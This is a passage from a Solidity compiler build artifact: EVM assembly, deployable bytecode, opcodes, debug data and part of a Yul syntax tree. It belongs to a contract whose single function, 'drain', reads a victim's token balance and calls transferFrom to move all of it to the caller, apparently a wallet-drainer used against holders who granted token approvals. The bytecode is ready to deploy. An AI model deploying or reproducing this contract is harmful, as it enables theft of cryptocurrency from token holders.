\"#utility.yul\":3281:3311   */\n      tag_34\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":3180:3317   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3323:3668   */\n    tag_20:\n        /* \"#utility.yul\":3390:3396   */\n      0x00\n        /* \"#utility.yul\":3439:3441   */\n      0x20\n        /* \"#utility.yul\":3427:3436   */\n      dup3\n        /* \"#utility.yul\":3418:3425   */\n      dup5\n        /* \"#utility.yul\":3414:3437   */\n      sub\n        /* \"#utility.yul\":3410:3442   */\n      slt\n        /* \"#utility.yul\":3407:3526   */\n      iszero\n      tag_80\n      jumpi\n        /* \"#utility.yul\":3445:3524   */\n      tag_81\n      tag_22\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":3407:3526   */\n    tag_80:\n        /* \"#utility.yul\":3565:3566   */\n      0x00\n        /* \"#utility.yul\":3590:3651   */\n      tag_82\n        /* \"#utility.yul\":3643:3650   */\n      dup5\n        /* \"#utility.yul\":3634:3640   */\n      dup3\n        /* \"#utility.yul\":3623:3632   */\n      dup6\n        /* \"#utility.yul\":3619:3641   */\n      add\n        /* \"#utility.yul\":3590:3651   */\n      tag_35\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":3580:3651   */\n      swap2\n      pop\n        /* \"#utility.yul\":3536:3661   */\n      pop\n        /* \"#utility.yul\":3323:3668   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220e9163db613faa4160efe8d9e09a63dd2a57f7be0f83c0460c8e05a206c0c7d7f64736f6c634300081d0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "6080604052348015600e575f5ffd5b5061033e8061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c8063837971e41461002d575b5f5ffd5b610047600480360381019061004291906101a0565b610049565b005b8173ffffffffffffffffffffffffffffffffffffffff166323b872dd82338573ffffffffffffffffffffffffffffffffffffffff166370a08231866040518263ffffffff1660e01b81526004016100a091906101ed565b602060405180830381865afa1580156100bb573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100df9190610239565b6040518463ffffffff1660e01b81526004016100fd93929190610273565b6020604051808303815f875af1158015610119573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013d91906102dd565b505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61016f82610146565b9050919050565b61017f81610165565b8114610189575f5ffd5b50565b5f8135905061019a81610176565b92915050565b5f5f604083850312156101b6576101b5610142565b5b5f6101c38582860161018c565b92505060206101d48582860161018c565b9150509250929050565b6101e781610165565b82525050565b5f6020820190506102005f8301846101de565b92915050565b5f819050919050565b61021881610206565b8114610222575f5ffd5b50565b5f815190506102338161020f565b92915050565b5f6020828403121561024e5761024d610142565b5b5f61025b84828501610225565b91505092915050565b61026d81610206565b82525050565b5f6060820190506102865f8301866101de565b61029360208301856101de565b6102a06040830184610264565b949350505050565b5f8115159050919050565b6102bc816102a8565b81146102c6575f5ffd5b50565b5f815190506102d7816102b3565b92915050565b5f602082840312156102f2576102f1610142565b5b5f6102ff848285016102c9565b9150509291505056fea2646970667358221220e9163db613faa4160efe8d9e09a63dd2a57f7be0f83c0460c8e05a206c0c7d7f64736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x33E DUP1 PUSH2 0x1C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x837971E4 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x1A0 JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD DUP3 CALLER DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 DUP7 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xA0 SWAP2 SWAP1 PUSH2 0x1ED JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xBB JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xDF SWAP2 SWAP1 PUSH2 0x239 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xFD SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x273 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x119 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x13D SWAP2 SWAP1 PUSH2 0x2DD JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x16F DUP3 PUSH2 0x146 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x17F DUP2 PUSH2 0x165 JUMP JUMPDEST DUP2 EQ PUSH2 0x189 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x19A DUP2 PUSH2 0x176 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1B6 JUMPI PUSH2 0x1B5 PUSH2 0x142 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x1C3 DUP6 DUP3 DUP7 ADD PUSH2 0x18C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1D4 DUP6 DUP3 DUP7 ADD PUSH2 0x18C JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x1E7 DUP2 PUSH2 0x165 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x200 PUSH0 DUP4 ADD DUP5 PUSH2 0x1DE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x218 DUP2 PUSH2 0x206 JUMP JUMPDEST DUP2 EQ PUSH2 0x222 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x233 DUP2 PUSH2 0x20F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x24E JUMPI PUSH2 0x24D PUSH2 0x142 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x25B DUP5 DUP3 DUP6 ADD PUSH2 0x225 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x26D DUP2 PUSH2 0x206 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x286 PUSH0 DUP4 ADD DUP7 PUSH2 0x1DE JUMP JUMPDEST PUSH2 0x293 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x1DE JUMP JUMPDEST PUSH2 0x2A0 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x264 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2BC DUP2 PUSH2 0x2A8 JUMP JUMPDEST DUP2 EQ PUSH2 0x2C6 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x2D7 DUP2 PUSH2 0x2B3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2F2 JUMPI PUSH2 0x2F1 PUSH2 0x142 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x2FF DUP5 DUP3 DUP6 ADD PUSH2 0x2C9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE9 AND RETURNDATASIZE 0xB6 SGT STATICCALL LOG4 AND 0xE INVALID DUP14 SWAP15 MULMOD 0xA6 RETURNDATASIZE 0xD2 0xA5 PUSH32 0x7BE0F83C0460C8E05A206C0C7D7F64736F6C634300081D003300000000000000 ",
							"sourceMap": "250:222:1:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@drain_104": {
									"entryPoint": 73,
									"id": 104,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_decode_t_address": {
									"entryPoint": 396,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_t_bool_fromMemory": {
									"entryPoint": 713,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_t_uint256_fromMemory": {
									"entryPoint": 549,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_addresst_address": {
									"entryPoint": 416,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 2
								},
								"abi_decode_tuple_t_bool_fromMemory": {
									"entryPoint": 733,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_uint256_fromMemory": {
									"entryPoint": 569,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 478,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 612,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 493,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed": {
									"entryPoint": 627,
									"id": null,
									"parameterSlots": 4,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 357,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 680,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 326,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 518,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 322,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 374,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 691,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_uint256": {
									"entryPoint": 527,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:3671:2",
										"nodeType": "YulBlock",
										"src": "0:3671:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:2",
													"nodeType": "YulBlock",
													"src": "47:35:2",
													"statements": [
														{
															"nativeSrc": "57:19:2",
															"nodeType": "YulAssignment",
															"src": "57:19:2",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:2",
																		"nodeType": "YulLiteral",
																		"src": "73:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:2"
																},
																"nativeSrc": "67:9:2",
																"nodeType": "YulFunctionCall",
																"src": "67:9:2"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:2"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:2",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:2",
														"nodeType": "YulTypedName",
														"src": "40:6:2",
														"type": ""
													}
												],
												"src": "7:75:2"
											},
											{
												"body": {
													"nativeSrc": "177:28:2",
													"nodeType": "YulBlock",
													"src": "177:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:2",
																		"nodeType": "YulLiteral",
																		"src": "194:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:2",
																		"nodeType": "YulLiteral",
																		"src": "197:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:2"
																},
																"nativeSrc": "187:12:2",
																"nodeType": "YulFunctionCall",
																"src": "187:12:2"
															},
															"nativeSrc": "187:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:2"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:2"
											},
											{
												"body": {
													"nativeSrc": "300:28:2",
													"nodeType": "YulBlock",
													"src": "300:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:2",
																		"nodeType": "YulLiteral",
																		"src": "317:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:2",
																		"nodeType": "YulLiteral",
																		"src": "320:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:2"
																},
																"nativeSrc": "310:12:2",
																"nodeType": "YulFunctionCall",
																"src": "310:12:2"
															},
															"nativeSrc": "310:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:2"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:2"
											},
											{
												"body": {
													"nativeSrc": "379:81:2",
													"nodeType": "YulBlock",
													"src": "379:81:2",
													"statements": [
														{
															"nativeSrc": "389:65:2",
															"nodeType": "YulAssignment",
															"src": "389:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "404:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "411:42:2",
																		"nodeType": "YulLiteral",
																		"src": "411:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "400:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:2"
																},
																"nativeSrc": "400:54:2",
																"nodeType": "YulFunctionCall",
																"src": "400:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "389:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "334:126:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "361:5:2",
														"nodeType": "YulTypedName",
														"src": "361:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "371:7:2",
														"nodeType": "YulTypedName",
														"src": "371:7:2",
														"type": ""
													}
												],
												"src": "334:126:2"
											},
											{
												"body": {
													"nativeSrc": "511:51:2",
													"nodeType": "YulBlock",
													"src": "511:51:2",
													"statements": [
														{
															"nativeSrc": "521:35:2",
															"nodeType": "YulAssignment",
															"src": "521:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "550:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "532:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:2"
																},
																"nativeSrc": "532:24:2",
																"nodeType": "YulFunctionCall",
																"src": "532:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "521:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "466:96:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "493:5:2",
														"nodeType": "YulTypedName",
														"src": "493:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "503:7:2",
														"nodeType": "YulTypedName",
														"src": "503:7:2",
														"type": ""
													}
												],
												"src": "466:96:2"
											},
											{
												"body": {
													"nativeSrc": "611:79:2",
													"nodeType": "YulBlock",
													"src": "611:79:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "668:16:2",
																"nodeType": "YulBlock",
																"src": "668:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "677:1:2",
																					"nodeType": "YulLiteral",
																					"src": "677:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "680:1:2",
																					"nodeType": "YulLiteral",
																					"src": "680:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "670:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:2"
																			},
																			"nativeSrc": "670:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:2"
																		},
																		"nativeSrc": "670:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "634:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "659:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nativeSrc": "641:17:2",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:2"
																				},
																				"nativeSrc": "641:24:2",
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "631:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:2"
																		},
																		"nativeSrc": "631:35:2",
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "624:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:2"
																},
																"nativeSrc": "624:43:2",
																"nodeType": "YulFunctionCall",
																"src": "624:43:2"
															},
															"nativeSrc": "621:63:2",
															"nodeType": "YulIf",
															"src": "621:63:2"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nativeSrc": "568:122:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "604:5:2",
														"nodeType": "YulTypedName",
														"src": "604:5:2",
														"type": ""
													}
												],
												"src": "568:122:2"
											},
											{
												"body": {
													"nativeSrc": "748:87:2",
													"nodeType": "YulBlock",
													"src": "748:87:2",
													"statements": [
														{
															"nativeSrc": "758:29:2",
															"nodeType": "YulAssignment",
															"src": "758:29:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "780:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "780:6:2"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nativeSrc": "767:12:2",
																	"nodeType": "YulIdentifier",
																	"src": "767:12:2"
																},
																"nativeSrc": "767:20:2",
																"nodeType": "YulFunctionCall",
																"src": "767:20:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "758:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "758:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "823:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "823:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nativeSrc": "796:26:2",
																	"nodeType": "YulIdentifier",
																	"src": "796:26:2"
																},
																"nativeSrc": "796:33:2",
																"nodeType": "YulFunctionCall",
																"src": "796:33:2"
															},
															"nativeSrc": "796:33:2",
															"nodeType": "YulExpressionStatement",
															"src": "796:33:2"
														}
													]
												},
												"name": "abi_decode_t_address",
												"nativeSrc": "696:139:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "726:6:2",
														"nodeType": "YulTypedName",
														"src": "726:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "734:3:2",
														"nodeType": "YulTypedName",
														"src": "734:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "742:5:2",
														"nodeType": "YulTypedName",
														"src": "742:5:2",
														"type": ""
													}
												],
												"src": "696:139:2"
											},
											{
												"body": {
													"nativeSrc": "924:391:2",
													"nodeType": "YulBlock",
													"src": "924:391:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "970:83:2",
																"nodeType": "YulBlock",
																"src": "970:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "972:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "972:77:2"
																			},
																			"nativeSrc": "972:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "972:79:2"
																		},
																		"nativeSrc": "972:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "972:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "945:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "945:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "954:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "954:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "941:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "941:3:2"
																		},
																		"nativeSrc": "941:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "941:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "966:2:2",
																		"nodeType": "YulLiteral",
																		"src": "966:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "937:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "937:3:2"
																},
																"nativeSrc": "937:32:2",
																"nodeType": "YulFunctionCall",
																"src": "937:32:2"
															},
															"nativeSrc": "934:119:2",
															"nodeType": "YulIf",
															"src": "934:119:2"
														},
														{
															"nativeSrc": "1063:117:2",
															"nodeType": "YulBlock",
															"src": "1063:117:2",
															"statements": [
																{
																	"nativeSrc": "1078:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1078:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1092:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1092:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1082:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1082:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1107:63:2",
																	"nodeType": "YulAssignment",
																	"src": "1107:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1142:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1142:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1153:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1153:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1138:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1138:3:2"
																				},
																				"nativeSrc": "1138:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1138:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1162:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1162:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nativeSrc": "1117:20:2",
																			"nodeType": "YulIdentifier",
																			"src": "1117:20:2"
																		},
																		"nativeSrc": "1117:53:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1117:53:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1107:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1107:6:2"
																		}
																	]
																}
															]
														},
														{
															"nativeSrc": "1190:118:2",
															"nodeType": "YulBlock",
															"src": "1190:118:2",
															"statements": [
																{
																	"nativeSrc": "1205:16:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1205:16:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1219:2:2",
																		"nodeType": "YulLiteral",
																		"src": "1219:2:2",
																		"type": "",
																		"value": "32"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1209:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1209:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1235:63:2",
																	"nodeType": "YulAssignment",
																	"src": "1235:63:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1270:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1270:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1281:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1281:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1266:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1266:3:2"
																				},
																				"nativeSrc": "1266:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1266:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1290:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1290:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nativeSrc": "1245:20:2",
																			"nodeType": "YulIdentifier",
																			"src": "1245:20:2"
																		},
																		"nativeSrc": "1245:53:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1245:53:2"
																	},
																	"variableNames": [
																		{
																			"name": "value1",
																			"nativeSrc": "1235:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1235:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_addresst_address",
